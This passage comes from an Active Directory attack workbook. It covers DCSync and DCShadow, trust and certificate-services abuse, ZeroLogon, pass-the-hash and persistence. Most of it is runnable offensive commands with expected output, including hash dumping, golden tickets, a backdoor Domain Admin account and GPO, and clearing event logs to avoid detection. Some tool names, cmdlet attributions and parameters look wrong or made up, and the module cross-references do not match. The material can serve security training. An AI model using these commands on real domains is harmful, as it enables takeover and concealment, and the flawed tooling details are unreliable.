
#### Mimikatz DCShadow  
```powershell
mimikatz.exe
privilege::debug
kerberos::golden /user:corp\DCShadow1$ /domain:corp.local /sid:S-1-5-21-... /krbtgt:7c6a180b36896a0a8c02787eeafb0e4c /id:11223344 /groups:512 /ptt
lsadump::dcshadow /push
```
#### **Invoke-DCShadow** (PowerShell) – DCShadow
```powershell

    Import-Module .\DSInternals.psm1
    Invoke-DCShadow -DomainController dc1.lab.local -AddReplicaLink
  ```
    
### Step-by-Step Guide  

#### Scenario A: Have Replication Rights  
- Run DCSync with Mimikatz:  
  ```powershell
  mimikatz.exe 'lsadump::dcsync /domain:corp.local /user:krbtgt' 'exit'
  ```  
- **Expected Output**: All domain user hashes.

#### Scenario B: Exploit ACL on AdminSDHolder  
- Check ACL:  
  ```powershell
  $aclSDH = Get-Acl "AD:CN=AdminSDHolder,CN=System,DC=corp,DC=local"
  $aclSDH.Access | Where-Object { $_.ActiveDirectoryRights -match "WriteDacl" }
  ```  
- **If “ShadowGroup” has WriteDACL**:  
  ```powershell
  $path = "AD:CN=AdminSDHolder,CN=System,DC=corp,DC=local"
  $acl = Get-Acl $path
  $rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule("corp\ShadowGroup","ExtendedRight","Allow","00000000-0000-0000-0000-000000000012")
  $acl.AddAccessRule($rule)
  Set-Acl -AclObject $acl $path
  ```
- Now members of `ShadowGroup` have replication rights. Perform DCSync.

#### Scenario C: DCShadow Attack  
- Generate Golden Ticket for rogue DC:  
  ```powershell
  Mimikatz.exe 'kerberos::golden /user:corp\DCShadow1$ /domain:corp.local /sid:S-1-5-21-... /krbtgt:7c6a180b36896a0a8c02787eeafb0e4c /id:11223344 /groups:512 /ptt'
  ```
- Register Rogue DC and push changes:  
  ```powershell
  mimikatz.exe 'lsadump::dcshadow /push'
  ```
    
    _Expected Output:_ Confirmation that rogue DC object registered and changes replicated.

----------

### Using Impackets

1.  **Enumerate ACLs for replication rights**
    
    ```powershell
    # List ACL entries on domain root
    Get-ObjectAcl -DistinguishedName "DC=lab,DC=local" -ResolveGUIDs | Format-Table IdentityReference,ActiveDirectoryRights
    
    ```
    
    _Purpose_: Identify who can replicate directory changes.  
    _Look for_: `DS-Replication-Get-Changes` or `DS-Replication-Get-Changes-All` rights.
    
2.  **If you have WriteDacl, grant replication rights**
    
    ```powershell
    # Fetch current ACL
    $acl = Get-Acl "AD:\DC=lab,DC=local"
    # Create replication ACE for your user
    $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
      "LAB\AttackerUser",
      "DS-Replication-Get-Changes,DS-Replication-Get-Changes-All",
      "Allow"
    )
    # Add and apply
    $acl.AddAccessRule($ace)
    Set-Acl "AD:\DC=lab,DC=local" $acl
    
    ```
    
    _Purpose_: Use existing ACL permissions to elevate to replication.
    
3.  **Run DCSync with secretsdump**
    
    ```bash
    # Dump all domain accounts via replication rights
    secretsdump.py -just-dc lab.local/AttackerUser:Pass@dc1.lab.local
    
    ```
    
    _Purpose_: Extract NTLM hashes without touching the DC database directly.  
    _Output_: Lines listing account names and corresponding hashes.
    
4.  **Perform DCShadow to inject changes**
    
    ```powershell
    # Register rogue DC and perform stealth replication changes
    Import-Module .\DSInternals.psm1
    Invoke-DCShadow -DomainController dc1.lab.local -AddReplicaLink
    # Example: create new admin account
    Add-DomainObject -Type user -Name "ShadowAdmin" -SamAccountName "ShadowAdmin" -Password (ConvertTo-SecureString "P@ssW0rd!" -AsPlainText -Force)
    
    ```
    
    _Purpose_: Push unauthorized changes that appear as normal replication.  
    _Verify_: Check Security Event ID 5136 for directory service modifications.
    

----------

### Expected Result

-   ACL enumeration reveals who can replicate or control objects.
    
-   DCSync outputs full NTDS.dit hashes.
    
-   DCShadow registers a rogue DC and writes changes undetected.
    

----------

### Mitigation & Hardening

-   Remove `DS-Replication-Get-Changes` from non-admin principals.
    
-   Monitor for unusual replication requests in DC event logs.
    
-   Audit and tighten ACLs on domain root and critical OUs.
    

----------

### Next Steps

1.  **Pass-the-Hash (PtH)**
    
    -   **What it is:** Authenticate to services using an NTLM hash directly, without needing the plaintext password.
        
    -   **Tool Example:** `pth-winexe`, `Impacket psexec.py`
        
        ```bash
        psexec.py -hashes :aad3b435b51404eeaad3b435b51404ee:1122334455... LAB\Administrator@dc1.lab.local cmd.exe
        
        ```
        
    -   **Use Case:** Access file shares or execute commands as a high-privilege account using its hash.
        
2.  **Golden Ticket Forging**
    
    -   **What it is:** Create a forged Ticket Granting Ticket (TGT) using the `krbtgt` account hash, granting unlimited domain access.
        
    -   **Tool Example:** Rubeus or Impacket’s `ticketer.py`
        
        ```powershell
        Rubeus.exe golden /domain:lab.local /sid:S-1-5-21-... /krbtgt:5566778899... /user:krbtgt /aes256:... /ticket:golden.ticket
        klist -li 0x3e7
        klist set-caching golden.ticket
        
        ```
        
    -   **Use Case:** Maintain persistent, stealthy Domain Admin access; bypasses password changes of the krbtgt account until ticket expiry.
        
3.  **Cleanup**
    
    -   **Remove DCShadow Objects:**
        
        ```powershell
        Invoke-DCShadow -Target dc1.lab.local -RemoveReplicaLink
        
        ```
        
    -   **Revert ACL Changes:** Remove the ACE you added for replication rights.
        
4.  **Detection & Recovery**
    
    -   Monitor for unusual Kerberos TGT requests (Event ID 4768) with high lifetimes.
        
    -   Rotate `krbtgt` account password twice, 24 hours apart, to invalidate forged tickets.
        

----------

## <a name="module-13"></a> Module 13: Domain Trust & Forest Attacks

_Move laterally across trust boundaries by abusing domain trust relationships._

### Key Concepts

-   **Domain Trust**  
    A link between two AD domains that allows users in one domain to access resources in another. Trusts can be one-way or two-way, external or forest.
    
-   **Trust Direction**
    
    -   **Child → Parent**: The child domain trusts the parent; users in child can access parent resources.
        
    -   **Parent → Child**: The parent trusts the child; users in parent access child resources.
        
-   **Cross-Forest Trust**  
    A trust between separate AD forests, allowing limited authentication across organizational boundaries.
    
-   **SID Filtering**  
    A protection that strips unauthorized SIDs from cross-forest tokens; bypassing it enables high-privilege impersonation.
    

----------

### Simplified Real-World Trust Diagram

![enter image description here](https://github.com/ShubhamDubeyy/Active-Directory-Workbook/blob/main/Forest.png?raw=true)

-   **Child Office ↔ Headquarter**: Child trusts Parent for Sales to access core resources.
    
-   **Headquarter ↔ Sister**: Two-way forest trust sharing user authentication.
    
-   **Headquarter ↔ Backup**: One-way trust allowing Backup domain to replicate from Headquarter.
    
-   **Headquarter ↔ External Partner**: External forest trust with limited access.
    

### 1. Domain Trusts Primer

_Identify and understand the trust relationships in your environment._

#### Tools & Commands

-   **nltest**
    
    ```bat
    # List trusts for LAB domain
    nltest /domain_trusts
    
    ```
    
    _Expected Output Snippet:_
    
    ```text
    Trusted domain list for domain \"LAB\":
      PARENT.lab.local (FOREST)
      CHILD.lab.local  (TREE_ROOT)
    
    ```
    
-   **Get-ADTrust** (PowerShell)
    
    ```powershell
    Import-Module ActiveDirectory
    Get-ADTrust -Filter * | Format-Table Name,TrustType,Direction,ForestTransitive
    
    ```
    
    _Expected Output Snippet:_
    
    ```text
    Name        TrustType Direction ForestTransitive
    ----        --------- --------- ----------------
    PARENT      Forest    Outbound True
    CHILD       External  Inbound  False
    
    ```
    

----------

### 2. Child → Parent Trust Abuse (Linux & Windows)

_Exploit an outbound child-to-parent trust to authenticate in the parent domain._

#### Tools & Commands

-   **evil-winrm** (Windows) / **crackmapexec**
    
    ```bash
    # Linux example with CME
    cme smb CHILD.lab.local/administrator@PARENT.lab.local -p 'Password1!'
    
    ```
    
    _Expected Output Snippet:_
    
    ```text
    PARENT\\administrator:Password1! (SMB)  
    [+] Logged in as PARENT\\administrator (SID S-1-5-21-...).
    
    ```
    

----------

### 3. Cross-Forest Trust Abuse (Linux & Windows)

_Bypass SID filtering to impersonate high-privilege accounts in another forest._

#### Key Concepts

-   **SID Filtering Bypass**  
    When disabled, users can add arbitrary SIDs to their token to escalate privileges across forests.
    

#### Tools & Commands

-   **impacket-AddComputer.py**
    
    ```bash
    # Command breakdown:
    # PARENT.lab.local/user:Pass => Credentials used (a user in parent domain)
    # -target-domain CHILD.lab.local    => Domain being joined/impersonated
    # -target-user 'lab\Administrator' => Account in target domain to impersonate
    AddComputer.py PARENT.lab.local/user:Pass \
      -target-domain CHILD.lab.local -target-user 'lab\Administrator'
    
    ```
    
    _What happens?_
    
    -   The tool uses ParentDomainUser credentials to authenticate to CHILD.lab.local.
        
    -   It forges a machine account in CHILD and maps the Administrator SID into the token, effectively letting you log in as CHILD\Administrator.
        
    
    _Expected Output Snippet:_
    
    ```text
    [+] Domain joined: CHILD.lab.local as lab\Administrator
    
    ```
    
-   **Rubeus**
    
    ```powershell
    Rubeus.exe ptt /ticket:crossforest.ticket
    
    ```
    
    _Expected Output:_ Forged ticket injected, access CHLD resources as high-priv user.
    

----------

### Expected Result

-   Successful listing of trust relationships.
    
-   Authentication in parent domain via child domain credentials.
    
-   Cross-forest resource access as high-privilege user when SID filtering is disabled.
    

----------

### Mitigation & Hardening

-   Enforce selective authentication on trusts to restrict which users can traverse.
    
-   Ensure SID filtering is enabled on all cross-forest trusts.
    
-   Monitor for unusual logons from trusted domains.
    

----------

### Next Steps

1.  Use compromised parent credentials to enumerate and pivot deeper.
    
2.  Clean up any forged tickets or SMB sessions to avoid detection.
----------


## <a name="module-14"></a> Module 14: AD Certificate Services Enumeration & Abuses

### Introduction  
Abuse misconfigured certificate templates to request certificates granting high-privilege authentication (PKINIT, DC authentication).

### Definitions  
1. **AD CS (Active Directory Certificate Services)**: Microsoft PKI solution.  
2. **Certificate Template**: Defines certificate properties and enrollment rights.  
3. **Enrollment Rights**: “Enroll” or “AutoEnroll” permissions on a template.  
4. **ESC Classes**: Attack categories (ESC1–ESC13).  
5. **PKINIT**: Kerberos extension for certificate-based authentication.

### Why It Matters  
- Misconfigured templates allow issuance of high-priv certificates to low-priv users → escalate to DA via PKINIT.

### Tools & Commands  

#### LDAP Queries  
- Find CA servers:  
  ```bash
  ldapsearch -x -H ldap://DC01.corp.local -b "CN=Configuration,DC=corp,DC=local" "(objectCategory=pKIEnrollmentService)" dsServiceName,distinguishedName
  ```  
- List templates on CA:  
  ```bash
  ldapsearch -x -H ldap://DC01.corp.local -b "CN=CORP-CA,OU=CAs,CN=Enrollment Services,CN=Services,CN=Configuration,DC=corp,DC=local" certificateTemplates
  ```  
- Enumerate all certificate templates and ACLs:  
  ```bash
  ldapsearch -x -H ldap://DC01.corp.local -b "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" "(cn=*)" msPKI-EnrollmentFlag,securityDescriptor,msPKI-ExtendedKeyUsage,distinguishedName
  ```

#### PowerShell  
- List templates and enrollment permissions:  
  ```powershell
  $templates = Get-ADObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" -Filter * -Properties msPKI-EnrollmentFlag,distinguishedName
  foreach ($t in $templates) {
    Write-Host "`nTemplate: $($t.Name)"
    $acl = Get-Acl ("AD:" + $t.distinguishedName)
    $acl.Access | Where-Object { $_.ActiveDirectoryRights -match "Enroll" } | Format-Table IdentityReference,ActiveDirectoryRights,InheritanceType
    }
  ```
- Check EKU:  
  ```powershell
  Get-ADObject -Identity "CN=Kerberos Authentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" -Properties msPKI-ExtendedKeyUsage
  ```

### Step-by-Step Guide  

#### 1. Find CA Servers  
```bash
ldapsearch -x -H ldap://DC01.corp.local -b "CN=Configuration,DC=corp,DC=local" "(objectCategory=pKIEnrollmentService)" dsServiceName,distinguishedName
```
**Expected Output**:  
```
dn: CN=CORP-CA,OU=CAs,CN=Enrollment Services,CN=Services,CN=Configuration,DC=corp,DC=local
dsServiceName: CORP-CA

dn: CN=Subordinate-CA,OU=CAs,CN=Enrollment Services,CN=Services,CN=Configuration,DC=corp,DC=local
dsServiceName: Subordinate-CA
```

#### 2. List Certificate Templates on CA  
```bash
ldapsearch -x -H ldap://DC01.corp.local -b "CN=CORP-CA,OU=CAs,CN=Enrollment Services,CN=Services,CN=Configuration,DC=corp,DC=local" certificateTemplates
```
**Expected Output**:  
```
certificateTemplates: Kerberos Authentication
certificateTemplates: DomainController
certificateTemplates: Computer
certificateTemplates: User
certificateTemplates: AuditAgent
```

#### 3. Enumerate Template ACLs  
```bash
ldapsearch -x -H ldap://DC01.corp.local -b "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" "(cn=*)" msPKI-EnrollmentFlag,securityDescriptor
```
**Expected Output (example)**:  
```
dn: CN=Kerberos Authentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local
msPKI-EnrollmentFlag: 16384
securityDescriptor:<…binary…>

dn: CN=DomainController,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local
msPKI-EnrollmentFlag: 16384
securityDescriptor:<…binary…>

dn: CN=Computer,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local
msPKI-EnrollmentFlag: 65536
securityDescriptor:<…binary…>

dn: CN=User,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local
msPKI-EnrollmentFlag: 16384
securityDescriptor:<…binary…>

dn: CN=AuditAgent,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local
msPKI-EnrollmentFlag: 16384
securityDescriptor:<…binary…>
```

#### 4. PowerShell: Check Enrollment Permissions  
```powershell
$templates = Get-ADObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" -Filter * -Properties msPKI-EnrollmentFlag,distinguishedName
foreach ($t in $templates) {
    Write-Host "`nTemplate: $($t.Name)"
    $acl = Get-Acl ("AD:" + $t.distinguishedName)
    $acl.Access | Where-Object { $_.ActiveDirectoryRights -match "Enroll" } | Format-Table IdentityReference,ActiveDirectoryRights,InheritanceType
}
```
**Expected Output**:  
```
Template: Kerberos Authentication
IdentityReference        ActiveDirectoryRights ObjectType   InheritanceType
CORP\Domain Admins       GenericAll            (GUID)       Descendents,This Object
BUILTIN\Administrators   GenericAll            (GUID)       Descendents,This Object

Template: DomainController
IdentityReference        ActiveDirectoryRights ObjectType   InheritanceType
CORP\Domain Admins       GenericAll            (GUID)       Descendents,This Object

Template: Computer
IdentityReference        ActiveDirectoryRights ObjectType   InheritanceType
CORP\Domain Users        ReadProperty,Enroll    (GUID)       Descendents,This Object
CORP\HelpdeskOps         Enroll                 (GUID)       Descendents,This Object

Template: User
IdentityReference        ActiveDirectoryRights ObjectType   InheritanceType
AUTHENTICATED USERS      ReadProperty,Enroll    (GUID)       Descendents,This Object

Template: AuditAgent
IdentityReference        ActiveDirectoryRights ObjectType   InheritanceType
CORP\AuditGroup          Enroll                 (GUID)       Descendents,This Object
```

### Exploit Scenarios  

#### Scenario A: Safe Templates  
- AD CS restricted to DA only → skip AD CS attack.

#### Scenario B: “Computer” Template Enrollable by Domain Users  
- Request a computer certificate and use PKINIT to impersonate machine.  

#### Scenario C: Custom “AuditAgent” Template with Enrollment Agent Rights  
- As `AuditGroup`, request Enrollment Agent certificate.  
- Use it to enroll for DA certificate via CA (ESC6).

### Shadow Credentials & Certificate-Based Attacks

_Use certificates and keys outside normal user objects for stealth._

#### Tools & Commands

-   **Certify** (BloodHound plugin)
    
    ```powershell
    # Enumerate vulnerable templates
    Import-Module .\Certify.psm1
    Get-CertificateTemplate | Where-Object { $_.AutoEnroll -eq $true }
    
    ```
    
    _Expected Output Snippet:_ Lists templates with Autoenroll for Authenticated Users.
    
-   **ADCSploit**
    
    ```bash
    # Request a certificate for persistence
    python3 adcsploit.py --template User --domain lab.local --dc dc1.lab.local
    
    ```
    
    _Expected Output:_ `Certificate issued: user.pfx`
    

----------

### Expected Result

-   Exploitable vulnerabilities identified and leveraged for high-privilege access.
    
-   Misconfigured AD objects discovered and abused for persistence.
    
-   Golden/Silver tickets loaded, granting long-term access.
    
-   Rogue certificates/keys created for stealth authentication.
    

----------

### Mitigation & Hardening

-   Apply patches for known vulnerabilities immediately.
    
-   Regularly audit and clean stale objects and trusts.
    
-   Rotate KRBTGT account password twice for golden ticket invalidation.
    
-   Restrict autoenroll and enforce approval workflows for certificate templates.
    

----------

### Next Steps

-   Use Golden/Silver tickets to move laterally and maintain persistence.
    
-   Clean up shadow credentials and revoke compromised certificates.
    
-   Monitor for unusual certificate issuance events in AD CS logs.
    

### Common Pitfalls  
- Misreading `msPKI-EnrollmentFlag`.  
- Missing EKU that allows PKINIT.  
- Overlooking custom templates.
- - - 
## <a name="module-15"></a> Module 15: Miscellaneous Misconfigurations

#### 1. Bleeding-Edge Vulnerabilities

_Leverage zero-day or newly patched weaknesses in AD protocols or services._

#### Tools & Commands

-   **CVE-2020-1472 (ZeroLogon) PoC**
    
    ```bash
    # Run ZeroLogon exploit to obtain machine account password
    python3 ZeroLogon.py dc1.lab.local
    
    ```
    
    _Expected Output:_ `SUCCESS: Exploit complete, authenticated as DC$ account!`
    
-   **PrintSpoofer**
    
    ```powershell
    Import-Module .\PrintSpoofer.ps1
    Invoke-PrintSpoofer -DC dc1.lab.local
    
    ```
    
    _Expected Output:_ `Hash captured: DC$::DOMAIN:010100...`
    

_Find and abuse stale or misconfigured AD objects._

#### Tools & Commands

-   **BloodHound**
    
    ```bash
    SharpHound.exe --CollectionMethod All
    
    ```
    
    _Expected Output Files:_ `objects.json`, `acls.json`, highlighting stale trusts and orphaned accounts.
    
-   **PowerView**
    
    ```powershell
    # Find stale computer accounts not changed in 90 days
    Get-ADComputer -Filter {LastLogonTimestamp -lt (Get-Date).AddDays(-90)} | Select Name,LastLogonTimestamp
    
    ```
    
    _Expected Output Snippet:_ Lists old computer accounts to target.
    

---

## <a name="module-16"></a> Module 16: Lateral Movement & Privilege Escalation

### Introduction  
Pivot across hosts using PtH/PtT, WinRM, PSExec, etc., and escalate local privileges to further domain compromise.

### Definitions  
1. **PtH (Pass-the-Hash)**: Use NTLM hash to authenticate without password.  
2. **PtT (Pass-the-Ticket)**: Inject Kerberos tickets into session.  
3. **Over-Pass the Hash**: Use NTLM hash in Kerberos flow (AS-REP).  
4. **WinRM**: Windows Remote Management protocol (PowerShell Remoting).  
5. **PSExec**: Tool for remote command execution.  
6. **DCOM**: Distributed COM for remote execution.  

### Why It Matters  
- Move to critical servers (file servers, AD CS, etc.) and escalate to DA if not yet.

### Tools & Commands  

#### PtH (Mimikatz)  
```powershell
mimikatz.exe 'sekurlsa::pth /user:corp\jsmith /domain:corp.local /ntlm:8846f7eaee8fb117ad06bdd830b7586c /run:powershell.exe'
```
- Then connect remote:  
  ```powershell
  Enter-PSSession -ComputerName WS002 -Credential corp\jsmith
  ```

#### PtT (Mimikatz)  
```powershell
mimikatz.exe 'kerberos::ptt TGT.kirbi'
```
- Check:  
  ```powershell
  klist
  ```
- Then SMB:  
  ```powershell
  net use \\WS002\C$ 
  ```

#### Over-Pass the Hash (Rubeus)  
```powershell
Rubeus.exe asktgt /user:corp\jsmith /aes256:HASH /domain:corp.local /dc:DC01.corp.local /ptt
```

#### Remote Execution  

- **WinRM**:  
  ```powershell
  Enable-PSRemoting -Force
  Enter-PSSession -ComputerName WS002.corp.local -Credential corp\jsmith
  ```
- **PSExec**:  
  ```powershell
  psexec \\WS002.corp.local -u corp\jsmith -p 'Password123' cmd.exe
  ```
- **DCOM (Impacket)**:  
  ```bash
  dcomexec.py corp\jsmith:Password123@10.0.0.20
  ```

### Step-by-Step Guide  

#### Scenario A: SMB Share Movement  
- Enumerate shares:  
  ```powershell
  net view \\WS002.corp.local
  ```
- Map share:  
  ```powershell
  net use Z: \\WS002.corp.local\C$ /user:corp\jsmith Password123
  ```

#### Scenario B: WMI Service Enumeration  
```powershell
Get-WmiObject -Class Win32_Service -ComputerName WS002.corp.local | Where { $_.StartName -like "corp\svc_*" } | Select Name,StartName
```

#### Scenario C: Scheduled Tasks  
```powershell
Invoke-Command -ComputerName WS002.corp.local -ScriptBlock {
  Get-ScheduledTask | Where { $_.Principal.UserId -like "corp\*" } | Select TaskName,Principal.UserId
}
```

### Common Pitfalls  
- SMB blocked by firewall.  
- Lacking local admin even with domain creds.  
- DCOM disabled.

### Next Steps  
- **Module 11**: Persistence & Cleanup  

---

## <a name="module-17"></a> Module 17: Persistence & Cleanup

### Introduction  
After achieving DA, establish persistence and clean up evidence.

### Definitions  
1. **SIDHistory**: Maintains old SIDs after migration—can be abused.  
2. **Golden Ticket**: Forged TGT enabling persistent KDC authentication.  
3. **Silver Ticket**: Forged service ticket.  
4. **GPO Backdoor**: Malicious GPO linked to maintain persistence.  
5. **Event Log Manipulation**: Clearing Windows logs to cover tracks.

### Why It Matters  
- Persistence ensures access; cleanup reduces detection.

### Tools & Commands  

#### Backdoor DA Account  
```powershell
New-ADUser -Name "svc_persistence" -SamAccountName "svc_persistence" -AccountPassword (ConvertTo-SecureString "P3rs1st!" -AsPlainText -Force) -Enabled $true -Path "CN=Users,DC=corp,DC=local"
Add-ADGroupMember -Identity "Domain Admins" -Members "svc_persistence"
```

#### Protect with AdminSDHolder  
```powershell
$sdhPath = "AD:CN=AdminSDHolder,CN=System,DC=corp,DC=local"
$acl = Get-Acl $sdhPath
$rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule("corp\svc_persistence","GenericAll","Allow")
$acl.AddAccessRule($rule)
Set-Acl -AclObject $acl $sdhPath
```

#### GPO Backdoor  
```powershell
New-GPO -Name "Corp-Backdoor" -Comment "Backdoor GPO"
Set-GPRegistryValue -Name "Corp-Backdoor" -Key "HKLM:\Software\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Logon\0\0" -ValueName "Script" -Type String -Value "powershell -Command `"Add-LocalGroupMember -Group 'Administrators' -Member 'corp\svc_persistence'`"
New-GPLink -Name "Corp-Backdoor" -Target "DC=corp,DC=corp,DC=local" -Enforced Yes
```

#### Golden Ticket  
```powershell
Mimikatz.exe 'kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:HASH /id:500 /groups:512 /ptt'
```

#### Cleanup  
- **Clear Event Logs**:  
  ```powershell
  Invoke-Command -ComputerName DC01.corp.local -ScriptBlock {
    wevtutil cl Security
    wevtutil cl System
    wevtutil cl Application
  }
  ```  
- **Remove Backdoor Account**:  
  ```powershell
  Remove-ADGroupMember -Identity "Domain Admins" -Members "svc_persistence" -Confirm:$false
  Remove-ADUser -Identity "svc_persistence"
  ```  
- **Revert AdminSDHolder ACL**:  
  ```powershell
  $sdhPath = "AD:CN=AdminSDHolder,CN=System,DC=corp,DC=local"
  $acl = Get-Acl $sdhPath
  $ace = $acl.Access | Where-Object { $_.IdentityReference -eq "corp\svc_persistence" }
  $acl.RemoveAccessRule($ace)
  Set-Acl -AclObject $acl $sdhPath
  ```  
- **Remove GPO**:  
  ```powershell
  Remove-GPO -Name "Corp-Backdoor" -Confirm:$false
  ```

### Common Pitfalls  
- Deleting your own rights prematurely.  
- Clearing only partial logs.  
- Leaving GPO links dangling.

---
